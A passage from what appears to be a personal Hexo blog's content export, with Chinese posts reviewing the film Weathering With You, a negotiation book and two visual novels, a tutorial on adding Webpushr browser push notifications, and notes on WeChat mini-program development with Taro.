<p>这一次的故事只有一点小奇幻。相比摆弄时间线的《你的名字》，这次的故事小儿科了很多。《天气之子》在空间和时间跨度上都不如你的名字，出场人物也少于你的名字。故事可以简简单单的用一句话概括，离家出走的少年在东京拯救可以操控天气的女孩。这么小的故事和动不动就毁灭世界的商业片比起来的确观感上的确逊色不少，但我很喜欢这样讲好一个小故事。有两个原因。第一个是细节。在同样的时长下，一个小故事可以有篇幅塞进跟多的细节，让整个故事有多面性。制作者可以从不同的角度去接近这个故事，或者从一些细节来讲述人物不表现出来的内容。比如圭介在雨过天晴后打开窗户，道路积水涌进了室内的镜头。这个镜头人物并没有说什么，但是这象征了圭介的释怀。第二个原因是较为简单的剧情会比较好理解。观众可以把更多的经历放在理解主旨上。</p>
<h2 id="主题">主题</h2>
<p>《天气之子》的其中一个主题跟我有较大的共鸣，少年的冲劲。女主阳菜牺牲了自己让东京回归了正常的天气。但是男主帆高不服气，他想让阳菜回来即使东京持续令人厌恶的阴天。在他为这个虚无缥缈的愿望奋斗的时候，之前的种种伏笔都在此刻变成了与帆高对抗的力量。比如警察想要以持枪的罪名逮捕帆高，圭介因为警察的许诺也出面阻止帆高。这个世界上没有谁和帆高一起为了这个目标努力。圭介的侄女须贺夏美和阳菜的弟弟天野凪都只能是辅助，他们的信念不如帆高强大，所付出的也不如帆高。“你小小的肩膀上承载着整个世界”（RADWIMPS）。这句话不只是对让世界放晴的阳菜，对于想要拯救阳菜的帆高也一样。作为一个旁观者，我们仔细思考一下。为了虚无缥缈的拯救，值得付出这么多吗？历史上并没有哪个晴女被救了回来。为了这个虚无缥缈的希望，我们与自己曾经的救命恩人，老板圭介对抗。东京的所有人都在赞颂晴天。他们与我们对立。警察也在因为持枪的事情紧追不舍。与警察对抗或许还会在人生的档案上留下不可磨灭的污点。这也是在于自己的未来抗争。如果现在放弃拯救，整个社会都会原谅我们。坚持去拯救真的值得吗？“人老了就是这样。不得不改变顺序了“（圭介）。先和警察回去，把事情交代清楚再来拯救阳菜或许是个更好的选择。和帆高差不了几岁的我更喜欢这个选择。（我人老了啊。）</p>
<p>这部电影的最后所有人都和这个执拗的少年和解了。圭介在警察的抓捕行动中被少年的冲劲所感动，选择帮助帆高。警察作为公正的象征，也仅仅是给帆高三年的保护观察处分。这并不会影响到帆高的未来。老奶奶作为东京大众的象征，也并没有对持续的降雨有多少怨言。”东京。。。只是恢复原样“（立花富美）。阳菜在消失的前一刻被帆高救下。如果在晚上个几天，阳菜或许已经消失了。这个社会还是很宽容的呢。</p>
<h2 id="对比">对比</h2>
<p>这部作品中的几个对比很有意思。其中一个是光影的对比。在大部分作品中，光是正面的象征。比如洞穴出口的光，火把的光。他们象征了希望或者是一些正能量的元素。黑暗则是有着不好的寓意。但是在这部作品中，这种象征被颠倒了。阴天包含着正面的含义。晴天则是阳菜用生命换来的。</p>
<center>
<img class="lazyload" data-src="/static/images/weatheringwithYou8.png" height="80%" width="80%">
</center>
<p>太阳光照进室内。又是一个美好的清晨不是吗。目光向下滑动到帆高满是汗水惊慌的脸上。这时突然反应过来，东京不是在下雨吗？哪来的阳光？难道阳菜消失了？积雨云之上，也是一片亮堂。但是这并不是美好的景色，而是阳菜消失了。从这一刻起，我无比怀念阴天。</p>
<p>另一个有意思的对比是年龄阅历。阳菜声称自己马上十八岁，生活中也一直扮演者大姐姐的角色，照顾着帆高和自己的弟弟。在警察口中我们得知她其实只有 15 岁。这到底是大姐姐还是小姐姐呢？这个冲突给人物带来的更多的吸引力。这个设定也没有 Bug，因为女孩子在这个年纪比男孩子成熟并且在阳菜在父母双亡的情况下一直照顾着弟弟。阳菜比较成熟也是情理之中。</p>
<p>总的来说，这部电影的主题是我最喜爱它的原因。少年的冲劲真的很能打动现在的我。</p>
]]></content>
      <categories>
        <category>Film</category>
      </categories>
      <tags>
        <tag>Film</tag>
        <tag>新海诚</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo使用Web Push Notification 浏览器通知推送</title>
    <url>/posts/98ae9e55/</url>
    <content><![CDATA[<p>Web Push Notification 是怎么工作的？个人博客为什么要使用它？如何使用它？</p>
<a id="more"></a>
<h2 id="intro">Intro</h2>
<p>最近你可能总是遇上这种弹窗。</p>
<center>
<img class="lazyload" data-src="/static/images/webPush4.png" height="60%" width="60%">
</center>
<p>这便是浏览器通知推送。如果你同意网站给你推送通知，你就会收到类似这样的消息。</p>
<p>但这对个人博客又有什么好处呢？</p>
<p>个人博客推送消息的渠道很少。能来访问个人博客的都是有缘人。一篇新的博客发布了，又有多少有缘人会知道呢？这些曾经访问过你的博客的人还会再次来访么？</p>
<p>大部分人了解博客是否有更新是通过 Rss 订阅。但是有多少读者订阅了博客的 Rss，又有多少收到 Rss 更新后来阅读了新文章，Rss 并不能给出任何统计数据。相比于 App 的通知推送，Rss 订阅对于博客主是静悄悄的。</p>
<p>另一个方式是邮件列表订阅。读者访问网站的时候，输入自己的邮箱。当博客更新的时候，读者会收到邮件提醒。这听起不错，至少作者可以很轻易地对读者进行广播。但是到底有多少读者会愿意输入自己的邮箱，又有多少读者会经常检查自己的邮箱呢？</p>
<p>Web Push Notification 给予了网站与用户交流的能力。虽然无法达到原生 app 那样，但也解决了前两种方式的问题。</p>
<h2 id="web-push-的优势">Web-push 的优势</h2>
<p>与传统的邮件列表相比，Web push Notification 有这样几点不同：</p>
<ol type="1">
<li>使用邮件推送，只有打开邮件的人才能看到推送的内容。如果使用 Web push Notification，任何一个在使用浏览器的人都会看到推送的内容。</li>
<li>由于阅读信息的比例高，点击通知的比例也会更高。更多的人会跳转到你的站点。PushEngage 曾看到过百分之五十的点击率。</li>
<li>Web push notification 还是一个较新的技术。浏览器通知的信噪比没有邮件那么高。</li>
</ol>
<p>从用户体验上来说，相较于传统的弹出式邮件输入框，Web-push Notification 更加的便捷。用户不需要输入一长串的邮箱字符，只需要按一下便可以接收之后的更新。并且一般弹出式的邮件输入框会降低谷歌的搜索排名。</p>
<p>传统的邮件列表的转换率为 1%-4%,然而 Web push notification 的转换率有 30%。或许因为大家对垃圾邮件都很讨厌，但是浏览器通知推送相对较新，还没有成为垃圾信息的象征。相较于潜在的垃圾邮件，大家更愿意接受一些新颖的科技。</p>
<p>根据<a href="https://blog.pushengage.com/push-notifications-for-browsers-new-emerging-marketing-channel-for-2016/">PushEngage</a>的研究，Web push notification 可以为你的站点带来额外 20%到 30%的重复访问。即那些曾经访问过你网站的人在收到浏览器通知推送后重新访问你的网站。除了流量的增加，Web push notification 的投资回报率是邮件的 2 倍 10 倍。这意味着在 Web push notification 十分之一的投入可以达到和邮件一样的效果。</p>
<center>
<img class="lazyload" data-src="/static/images/webPush2.png" height="80%" width=“80%”>
</center>
<h2 id="web-push-notification-原理">Web Push Notification 原理</h2>
<p>Web Push Notification 其实分为两块。一个是推送，另一个是通知。</p>
<p><strong>推送</strong>就是服务器向浏览器发送信息。<strong>通知</strong>则是浏览器显示信息的一种方式。</p>
<p>通过调用 NotificationAPI,网站可以向用户发送通知。但是不管发送什么通知，第一步是申请权限。只有用户给予网站通知权限，网站才可以展示通知。通知的样式为系统通知样式。往往具有一个头像，标题，正文以及两个按钮。</p>
<p><strong>推送</strong>的过程可以参照下图。</p>
<center>
<img class="lazyload" data-src="/static/images/webPush1.png">
</center>
<p>图中的 web page 是网站。Service worker 是独立于网页，运行在浏览器后台的脚本。Use agent 为用户端，也就是浏览器。 Application server 为业务服务器，决定着推送的内容和什么时候触发 Push service。Push service 则是推送服务。当 Application server 将准备好的内容发送给 Push service 后，push service 负责将内容分发给所有订阅这个网站的用户。</p>
<p>从时序上来说，网站首先获取客户端的推送的权限。接着网站会注册一个 service worker 用来接收推送信息。Service worker 是运行在浏览器（客户端）后台的脚本。这样即使网站被关闭，用户照样可以收到来自网站的消息。网站注册了推送用的 Service worker 后，客户端会返回<code>PushSubscription</code>。<code>PushSubscription</code>包含了推送消息所需要的一切数据。</p>
<p>当业务服务器想要推送消息时，它便去调用 Push service。Push service 会通过<code>Web Push Protocol</code>向客户端推送消息。</p>
<p>需要注意的是不同的浏览器会使用不同的 Push service。</p>
<h2 id="如何添加-web-push">如何添加 Web-push</h2>
<p>静态站点的一个特点便是他没有后端服务器。但是 Web push 必须要一个业务服务器来调用 Push service。云服务或许是一个很好的选择。</p>
<p>下面这张图对比了市场上主流的 Web push notification 云服务。</p>
<center>
<img class="lazyload" data-src="/static/images/webPush3.png">
</center>
<p>如果你是学生，或许<a href="https://pushbots.com">pushbots</a>也在你的考虑范围之内。因为 Github Student pack 包含了<a href="https://pushbots.com">pushbots</a>六个月的免费使用。</p>
<p>综合来说我最后选择了<a href="https://www.webpushr.com/">Webpushr</a>。主要原因有：</p>
<ol type="1">
<li>它免费额度很多。</li>
<li>它的通知弹窗可以自定义。不是单单只有浏览器自带的申请通知权限的小弹窗。</li>
<li>它支持主流浏览器和 Safari。</li>
<li>它的 Dashboard 比较清楚。</li>
</ol>
<h3 id="安装">安装</h3>
<p>接下来需要做的就是跟着官方教程，将它的 SDK 插入到网页当中。</p>
<p>第一步是将官方提供的<code>webpushr-sw.js</code>放到网站根目录中。</p>
<p>接着将以下代码插入到网页中就可以了。确保每一个你想要询问用户接受通知的页面都要包含以下代码。对于 hexo 用户，建议将其加入<code>index.ejs</code>即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- start webpushr tracking code --&gt;</span><br><span class="line">&lt;script&gt;(<span class="function"><span class="keyword">function</span>(<span class="params">w,d, s, id</span>) </span>&#123;w.webpushr=w.webpushr||<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;(w.webpushr.q=w.webpushr.q||[]).push(<span class="built_in">arguments</span>)&#125;;<span class="keyword">var</span> js, fjs = d.getElementsByTagName(s)[<span class="number">0</span>];js = d.createElement(s); js.id = id;js.src = <span class="string">&quot;https://cdn.webpushr.com/app.min.js&quot;</span>;</span><br><span class="line">fjs.parentNode.appendChild(js);&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;webpushr-jssdk&#x27;</span>));</span><br><span class="line">webpushr(<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;ABCDpbdgvBCWXqXI6PtsUzobY7TLV9gwJU8bzMktrwfrSERg_xnLVbjpCw8x2GmFmi1ZcLTz0ni6OnX5MAwoK95&#x27;</span>);&lt;/script&gt;</span><br><span class="line">&lt;!-- end webpushr tracking code --&gt;</span><br></pre></td></tr></table></figure>
<h3 id="safari">Safari</h3>
<p>如果你正确安装了SDK，那么除了 Safari 的所有浏览器都是可以收到通知推送了。如果想要让 Safari 浏览器接受通知，还要多做一些步骤。</p>
<p>首先你需要一个苹果开发者账号，接着生成一张全新的证书就可以了。</p>
<p>思路看上去很简单。但是具体做起来需要 20 分钟到半个小时。详细的教程在<a href="https://pushalert.co/documentation/creating-safari-web-push-certificate">这里</a>。</p>
<p>如果你上传了证书，但是 Safari 还是没有弹窗和通知，你也不要慌。这似乎需要时间。等上个半天，再打开看看有没有生效。</p>
<h3 id="ask-for-notification-prompt">Ask-for-Notification Prompt</h3>
<p>这指的是询问读者是否要接收通知的弹窗（以下简称为弹窗）。在 Set up&gt;Edit custom prompts 中可以对弹窗进行自定义。具体可以对标题，正文，头像和两个按钮进行自定义。</p>
<h3 id="通知自定义">通知自定义</h3>
<p>通知可以自定义的主要部分有标题，正文，点击时跳转的链接，以及两个按钮。</p>
<p>值得一提的是你可以对你的用户进行分类。对不同类别的观众进行推送。比如对于不同地区的读者，推送不同语言的通知。</p>
<h2 id="总结">总结</h2>
<p>相信有了 Web push notification，你的站点的流量会增加。如果你的内容足够有趣，那些曾经访问过你站点的人在收到新文章的通知后，又有什么理由不点开呢？</p>
<p>个人站点的流量本来就很少，如果不能好好抓住那些曾经来过的人，流量的增长会十分的缓慢，甚至没有任何增长。Web push notification 就可以帮助你有效的抓住那些曾经来访的人，将他们转换为稳定的流量。未来，他们还会回来访问你的博客。</p>
<p>新文章发布，通知推送。这两个流程如何结合在一起？我们如何做到发布新文章，消息便自动被推送给用户？这些问题会在下一篇文章中进行讨论。</p>
<p><a href="https://www.inevitable.tech/posts/afd56cf2/">这儿</a>是特殊解决方案。</p>
<p><a href="https://www.inevitable.tech/posts/a1b574bb/">这儿</a>是泛用解决方案。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>push notifications</tag>
        <tag>服务器推送技术</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序开发-Taro</title>
    <url>/posts/85fb390f/</url>
    <content><![CDATA[<p>第一次尝试一下微信小程序开发。 <a id="more"></a></p>
<h2 id="注册">注册</h2>
<p>微信小程序需要实名注册，如果以个人进行实名认证，小程序是不可以接入微信支付功能的。如果是企业认证，企业的资格认证必须和小程序的分类一样。例如，做电商的小程序，企业必须要有电商的资格认证。</p>
<p>同一个人，可以实名5个小程序。但是操蛋的是，你必须给每个小程序都注册一个账号，然后每个小程序都进行一次实名认证。没错，管理小程序的平台上，账号是一个小程序一个账号，而不是一个开发者一个账号。我身边的朋友，写小程序已经写到没有邮箱进行注册了。</p>
<h2 id="框架">框架</h2>
<p>我用了京东的Taro框架。好处是可以一份代码，编译多个平台。一份代码，可以编译出H5，RN,微信小程序，支付宝小程序，抖音小程序等等。当然得在兼容上做一些处理。</p>
<p>我一开始其实看中了它与React类似的特点。语法类似，整个思路也类似。当然用下来的感觉，实在是一般。</p>
<h3 id="安装">安装</h3>
<p>简单的<code>npm install</code>怎么可能出错呢。</p>
<p>安装过程简直痛苦。先是一开始的权限不够（改用管理员运行Powershell即可）。接下来是安装<code>tarojs/sass</code>这个包的时候有一个<code>node-sass</code>的依赖，这个依赖需要编译<code>node header</code>。每次安装请求<code>node header</code>的源码时，都是<code>404</code>。</p>
<p>仔细查了一查，在我安装<code>Taro</code>本体的时候，它创建了一个<code>.npmrc</code>。在这个文件里，写了上游路径，淘宝的NPM仓库。可能问题在于淘宝的NPM仓库没有<code>node header</code>。删了<code>.npmrc</code>，整个安装过程就没有问题了。</p>
<h3 id="使用">使用</h3>
<p>文档实在是有点烂。就是单纯的列举API，Component。官方也没有一个Tutorial。</p>
<p>很多时候都要在微信小程序的API文档和Taro的API文档进行切换。这之中会漏掉许多小细节，比如<code>cloud.init()</code>。</p>
<p>支持NPM包管理。怎么想都是很强大的特点，毕竟JS的第三方库可是多到吓人。然而真的用起来，很多包都过不了编译环节。因为目前Taro的编译器不支持压缩ES6语法的node包。像什么Firebase那是没得用，乖乖去用微信云开发。</p>
<p>对于单元测试什么的，官方也没有进行过多的解释。导致我项目根本没有写任何测试。</p>
<h2 id="微信云开发">微信云开发</h2>
<p>微信小程序可以很方便的连接到微信云开发上，其实也就是个云函数和数据库。要想访问云数据库，运行你的小程序，得用官方的微信小程序开发工具。</p>
<p>这玩意真的是卡的不行，吃爆炸多的资源。功能还很弱。</p>
<p>云数据库的刷新奇慢无比，云函数简陋的不行。云函数还不支持在线编辑，也没办法在微信小程序开发工具里看到云函数的代码。任何小问题都得在本地进行修改，再上传云端。</p>
<p>Debug功能可以说是简陋，要啥没啥。跟隔壁的Flutter比起来，真的没法比。</p>
<p>实际运行上，小程序的打开时间和渲染时间都不怎么理想。我也就从服务器抓取数据，再在ListView上进行显示，时间是10秒左右。</p>
<h2 id="审核">审核</h2>
<p>如果审核失败，想要知道详细的理由，或者辩解一下，根本没人回应。发帖进行咨询，审核人员也没有什么回复。审核没过就是没过，资质的审核还是较为严格的。</p>
<h2 id="其他">其他</h2>
<p>开发的时候如果想要调用外部资源，是要在微信平台上进行注册的。一个程序只允许从一个站点获取资源，并且这个站点必须有国内的备案。如果你想调用API，想都不用想。。。。除非加一个跳板。</p>
<p>这个坑有点坑，能不跳就不跳。社区，文档的支持也比较少。遇到很迷的问题很容易就在那卡很久。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>掌控谈话</title>
    <url>/posts/4aafd4f0/</url>
    <content><![CDATA[<p>掌控谈话是一本非常容易读的书。它像很多讲述方法的畅销书一样，有清晰的标题，副标题，章节小节。每个章节中都有大量生动形象并且紧张刺激的谈判故事作为例子。在紧张刺激的谈判故事的帮助下，这本书的易读性要比专业书籍高上很多。 <a id="more"></a></p>
<p>这本书所能应用的环境是情感所主导的谈判。书中的部分技巧有安抚情绪的作用。当理智重新主导谈判的时候，我们需要用的就是传统的谈判技巧，而不是这本书中的了。</p>
<p>作者认为一个信任合作的气氛对于谈判有莫大的益处。合作意味着大家都为着一个结果而努力着。当对手看到了他自己的付出，便不想一无所有的结束谈判。毕竟没有达成任何的协议意味着浪费了精力。</p>
<p>这本书一共讲了小十个谈判技巧。章节名称职的解释着每一章的内容。第二章到第四章，第七章和第八章我觉得是比较实用的章节。 • 第二章：重复对方的话——建立和谐关系 • 第三章：体会他人痛苦，不如把他们的痛苦”标注“出来——如何利用策略同理心来建立信任 • 第四章：小心”是“，掌控”不“——如何营造氛围，以便安全地与风险共舞 • 第五章：得到一句话，瞬间改变谈判——如何成功地说服他人 • 第六章：扭转现实——在面临失败时，该如何努力塑造结果 • 第七章：制造控制的幻觉——如何用校准问题来消弭对抗，赢得合作 • 第八章：确保执行——如何发现撒谎者，确保所有人贯彻执行 • 第九章：互利原则，极端与设点——如何得到你想要的价格 • 第十章：得到黑天鹅。</p>
<p>我在生活中也运用了很多一二章中的技巧。当我与一个不喜欢的人交流时，我会选择重复他的话。这样我可以尽可能的不动脑子，却给对方带来倾听的感觉。在这样的一来一回中，聊天也可以继续下去。但在中文中，单单重复话里的最后三个词显得粗糙和敷衍。因此我会变化句式但是保留对方话中的关键词。然后等对方解释自己的上一句话，或者继续往下讲。（我就是一个智能复读机）</p>
<p>第二章则是在对方比较情绪化的时候使用。通过用语言描述对方的情感和状态来让对方冷静下来。这似乎很简单。但临场时，描述对方的情感就跟憋命题作文一样，半天想不出一句话。我往往只能构造一句不超过10个字的描述。然而过短的描述常常效果会打折。</p>
<p>第七章中的校准问题就是为营造合作的环境而生。与中国人含蓄的思维不同，书中主张抛出一些直接的问题。比如How，What，When引导的开放问题。通过这些开放的问题，让对方疲于思考。这样对方就在为解决问题而贡献一部分精力。然而在中国人看来，我们不应该问这么直接的问题。我们或许应该去揣测对方话中的含义，而不是直接进行开放性提问。比如，直接问对方“我应该怎么做呢？”听起来太过直白，而且有示弱的意味。但却可以鼓动对手与你一起去解决问题。</p>
<p>第九章提到出价的时候，首先要有一个心理预期。这个东西我认为价值多少钱。接着从心理价位的百分之六十五开始出价。逐渐在谈判中涨到百分之八十五到百分之九十五到百分之一百。在这个过程中每次涨价的幅度都是上次的一半。这可以给对手一个自己逐渐逼近底线的错觉。如果心理价位是一个精确到小数点后几位的数字，可以让对手相信这是一个经过计算后的数字。</p>
<p>语调是每句话都会包含的东西，但是很多时候我们不会去刻意控制。作者建议我们在大多数时候使用下降的语调，这样会传达给听者积极的情绪。不止是书中说的，我注意到想要让英语听起来地道，语调也是很重要的一环。可能由于说英语总是边思考边说，语调总是上扬的。连陈述句都可以讲出不确定的口气。</p>
<p>委婉的拒绝又是我学到的另一个小技巧。“我该怎样做？”可以帮助我不伤和气地拒绝对方的请求。如果对方真地解答了我的问题，但是我还是想拒绝，“你的建议十分慷慨，但抱歉，这对我而言不起作用。” 更进一步的拒绝还有，“对不起，恐怕我做不到。“，“对不起，不行。” 后两句中的对不起冲淡了句子中拒绝所带来的冒犯的意味。</p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>掌控谈话</tag>
        <tag>谈判</tag>
        <tag>说话技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>纸上魔法使-现实与幻想的界限</title>
    <url>/posts/9cd8513c/</url>
    <content><![CDATA[<p>游走在现实与幻想，在故事的指引下，斩破虚妄。 <a id="more"></a></p>
<p>最近打通了纸上魔法使,剧情好评-一波三折,BGM很有气氛。游戏进行到后半段，游戏主程序崩溃了。由于不可抗力的因素，我debug失败。最后小半段就只能光看看剧本了。共通线就是一个完整的剧情，我就并没有看个人线的剧情。整个游戏给我讽刺的感觉。由一个幻想的故事来教我思考现实和幻想的界限，由一个故事告诉告诉我别看故事了-故事全是虚幻的，勇敢面对现实吧。那先让我们关注在游戏本身吧。</p>
<p>这是月社妃在废弃的教堂中咏唱。 <img class="lazyload" data-src="/static/images/zhishangmofashi1.jpg"></p>
<p>这个游戏的剧情很有意思，不光是叙述方式，还有内容。叙事的角度不断的在主角们之间进行切换，这让读者更加深刻的去理解主角们心中的渴望。我曾在中途放弃过游戏，这游戏打起来的确是令人感到胃痛，剧情不断的翻转给我带来的不是希望，而是将我沉到了海底--四处都是黑暗，冰冷无比。整个游戏围绕着魔法书展开，讲述了主角斩破虚妄寻求真实的故事。游戏在一开头就通过比喻的方式告诉了我们夜子的情况,一些关于主线的提示：</p>
<blockquote>
<p>现实，铅字织成的纸香世界。 幻想，模糊虚实界线的事实。 尽管围困，埋没，沉溺于狭小的世界，却委身于失去了虚实界线的现实。 以自己的意志选择留在笼中的小白鸟，直至尸骨腐朽也拒绝展翅。 她不曾渴望翱翔空中。 那是没有翅膀的人拥有的特权。 世上一切演绎悲欢离合的故事。 不断体会这些故事是我的生活。 .... 可是—— 我对这种生活没有不满。 岂止没有不满，甚至觉得充实。 只有铅字的笼中世界，看上去比外面的世界要美得多。 这里是属于我的世界，它那么的温柔美好。 伫立于森林深处的幻想图书馆，向我展现甜蜜的幸福。 日常与非日常交织，常识不复存在。 魔法般的故事，奇迹般的故事，都走进现实。 问这是谁的把戏，让我们齐声回答吧。 选择留在笼中的小白鸟，你带着期待观察奇迹吧。</p>
</blockquote>
<p>剧情中，有许多这样的比喻来影射真实。在剧情的一开头就提到了<strong>真实可能是残忍的</strong>。游戏开头，非常日常，气氛温馨。非常简单的男主与三个女孩的同居生活。但是偶尔出现的细节体现出了种种的暗流涌动，事情没有这么简单。第一本，第二本魔法书的打开只给游戏增添了魔幻的 氛围。然而之后的魔法书的打开却一步一步揭露了人物内心的渴望（魔法书会响应打开者内心的欲望）。随着魔法书的打开，在现实与虚幻的交界出出现了不和谐的感觉。在主角琉璃和彼方的调查下，现实的虚幻被逐渐揭示了出来。主人公们都生活在魔法书的影响下。在破除了一本又一本的魔法书之后，他们看到了残忍的现实。然而一切细节指向还有魔法书正在闪耀，他们刚发现的残忍的又被证明为虚伪。紧接着一波调查，迎接他们的是更加令人难以置信，残酷的事实。主人公们就这样挣扎在虚幻与现实的边缘，反转，反转，再反转。冰冷残酷的事实接踵而来。故事的节奏越来越快，气氛越来越压抑。直至最后，所有的矛头都指向了夜子-沉迷铅字的女孩。魔法使响应了夜子心中的欲望，让魔法书出现在指定的人手中，并诱导他们打开，造成了一个又一个的悲剧。一切都是源于夜子的懦弱以及自私。整个剧情更像是讲述夜子的成长,从一个沉迷于书中，不去了解自己的人到了解到了自己的懦弱，自私以及嫉妒。在最后，夜子认识到了自己的自私以及懦弱。她没有能力消灭它们，她只是正视了它们。夜子放弃了温柔的幻想，选择了残酷的现实。琉璃不会接受夜子表白，夜子失恋的现实。</p>
<p>这个剧情更像是在嘲讽宅们。就像夜子一样，自私，懦弱的宅们沉浸在自己温柔的幻想中。不断的规避自己的真正的情绪，渴望，将一切放在心底，将一切化为嫉妒以及憎恨。就像之前引用的那一段话一样，就是来嘲笑宅们，沉溺在故事中，还有网络小说中的人们。在虚无缥缈的幻想中是得不到幸福的，幻想与现实的界限所带来的不协调会逐渐压缩你们的生存空间。你们别无选择，没有勇气走入现实，那就永远沉沦在幻想之中吧。不断的沉沦在幻想中只能让你们离幸福越来越远。不但伤害了自己，还伤害到了喜欢你们的人。所以要仔细审视自己的行为，感情以及行为。找出任何自己不愿承认的不协调之处，将自己从幻想与现实的界限推进现实。你们所看到的故事都是他们的故事，你们还没有谱写属于自己的故事。这款gal用一个故事来嘲讽爱看故事的人，这份魄力令人敬佩。</p>
<p>整个gal还给玩家一个思考题:现实和虚妄应该如何取舍。感到讽刺的是，提出这样一个问题的是一个游戏。如果回答选择现实，这款归类于虚妄的游戏已经对现实的你产生了影响。你还算选择了现实吗?走到这样一个死路口，我尝试重新去定义现实和虚妄。(幻想和虚妄在我心中含义是相同的)虚妄和现实的界限在哪？我应该如何取舍？</p>
<p>受过多年科学教育的人会从物理的角度定义现实与虚幻。有实体存在的便是现实。那么国家，亲情，爱情是不是虚幻的呢?相比于从物理的角度去定义，我会从互动的角度去定义。可以与我互动，并对我的互动做出反馈的便是现实。反之只能单方面影响我的便是虚幻。我更加喜欢现实，应为现实会对我的行为进行反馈。在这样的互动中，我可以不断去改变我的行为，获得不同的反馈。这样的新奇感是我生活动力的一大来源。都说游戏要有打击感，生活也是需要反馈的。然而只有真实会给我反馈，虚幻并不会给我反馈。</p>
<p>这个Gal中塑造的形象很饱满。每个人都有些曲折的经历，背景。可怜的理央，懦弱自私的夜子，开朗、坚持爱情的彼方，以及我最喜欢的月社妃—理智，真诚，安静，毒舌(喜欢嘲讽)。月社妃不讲一句废话，每句话要么是有深层次的含义，要么是讽刺，要么是表达自己的真实感情。每个人都至少有一本魔法书来描述她的性格,来诉说她心中的渴望。真正的理解了这些人，就会觉得这个故事不是发生在电脑屏幕里，而是发生在身边，一举一动都牵动着心情。令人值得一提的是琉璃和汀的关系。大家互相理解，相互隐瞒某些东西，互相坑。其实我也有相似的感受。虽然知道他不是个好东西，因为别无选择，只能选择和他做朋友。他的性格，价值观，爱好都与我相近。其他人由于截然不同的价值观，和爱好，更加的合不来。由于思考方式的大差异，与其他人几乎没有任何默契的存在。重申一遍：月社妃这样的性格真的很吸引我。</p>
<hr>
<p><img class="lazyload" data-src="/static/images/zhishangmofashigift.jpg"></p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
        <tag>纸上魔法使</tag>
      </tags>
  </entry>
  <entry>
    <title>想要传达给你的爱恋</title>
    <url>/posts/f2f7dc5d/</url>
    <content><![CDATA[<p>我，想要传达给你什么呢？ <a id="more"></a></p>
<h2 id="intro">INTRO</h2>
<p>这个游戏所讲述的故事就像他的标题所说的那样，想要传达给你的爱恋。在这款游戏中，除了看到精彩的剧情演绎，也可以看到新岛夕的一些想法-作为一个脚本家的自白。写作是为了去传达某些东西，去传达某些情感。新岛夕也是履行了这个作品的宣传口号：甜蜜到令人害羞的作品。新岛夕大概写出了一个跟初恋一样甜蜜又遗憾的作品。在初恋中，大家甜甜蜜蜜，但是裂痕或许在不经意间已经埋下。当恋情破碎之时，两人再次相遇，新岛夕很好的描绘出了两人的害怕，不舍，怀念，遗憾。失去了伸出手抓住你的勇气，只是在边缘不断地徘徊，两人之间奇怪的亲密感和距离感也被很好的凸显了出来。酸甜，又苦涩的爱恋，或许，是新岛夕想要表达的。</p>
<p>这个游戏共同线到个人线的转折并没有那么的生硬（或许是我打的姬野星奏线的原因）。由于我个人的原因我只打通的姬野星奏线和TE。我真的不忍心再去走完新堂彩音线，当熟悉的BGM再次响起，心底的苦涩总会再次涌出。那个我忘不掉的，属于星奏的故事。因此新堂彩音线我只走了一个开头，但是我也发现了一些跟姬野星奏有关的有趣的事情。</p>
<p>星奏的主题或许就是两个年轻人青涩的爱情。在这段爱情里，欺骗与猜忌是常有的事情。（为什么你们就不能明白沟通的重要性？）星奏线带给了我好久没有体会到的五味杂陈的感觉。我喜欢星奏，但我也讨厌星奏，我对她失望，但是我又心疼她。<strong>可能</strong>这就是初恋的感觉，甜蜜，苦涩同时从心底浮起。</p>
<h2 id="星奏线">星奏线</h2>
<p>不得不说TE给星奏现增添了不少的亮色，就像画画时给一个物体加上了阴影。虽然画面有了更多的深色，但她却更加真实了。由于日系游戏向来是由人物驱动，我们先从人物说起。</p>
<h3 id="人物">人物</h3>
<h4 id="星奏">星奏</h4>
<p>星奏作为本游戏的钦定女主角可真的是非常棒呢。性格上给人一种轻飘飘的感觉，但是却意外的有自己的坚持呢。面对洸太郎的爱恋，星奏也是不知所措，只能不断的去被动的回应洸太郎所传达的感情。同时星奏真的是一个爱撒谎的孩子，总是在关键问题上遮遮掩掩。总而言之，星奏就是这样一个打动人心，却又令人琢磨不都的女孩子。洸太郎琢磨了你这么久，他还是没有弄懂啊。</p>
<center>
<img class="lazyload" data-src="/static/images/koikake-1.png" height="80%" width="80%">
</center>
<h4 id="洸太郎">洸太郎</h4>
<p>洸太郎作为本篇青涩的男主，留下了不少的遗憾。他猜忌，胆小，不坦诚，为了保护自己不断的去伤害别人，还经常沉浸在自己的世界，用歪曲的逻辑安慰自己。到底有多少话，他本应该说出来，去询问星奏，而不是靠自己的猜忌得出答案。</p>
<p>从小他就在伤害星奏。因为同学的起哄，他疏远星奏。他把星奏地搭话置于不顾，还给自己找了个借口。从小他就这样，长大后的他也没有改变。 <blockquote><p>只是当时我自我意识实在太强，所以变得相当弱气。 虽然现在也是。 所以。。。。自那以后，我就没再主动接近过姬野。 有意识地避开了她。 反倒是姬野，似乎对我有了一些亲切感。 数次主动来找我搭话。 然而， 洸太郎： 【。。。。。】 我却无视了有什么想说的姬野。 还是不要和我这种人扯上关系会比较好。 如果你和我关系变好的话，会被班上的人说“没人要的孩子黏在一起”的哦。 我甚至想着这样的理由，来吧自己的胆小正当化。</p>
</blockquote></p>
<p>在步入高中后，洸太郎也一直在催眠自己，压抑自己心中的星奏的情感，对那份情书的顾虑。可是见了面以后，他非但没有表现出自己真正的情感，反而是采取了一种戒备的态度。直到最后认输，才彻彻底底地表达对星奏的情感。</p>
<h4 id="精华">精华</h4>
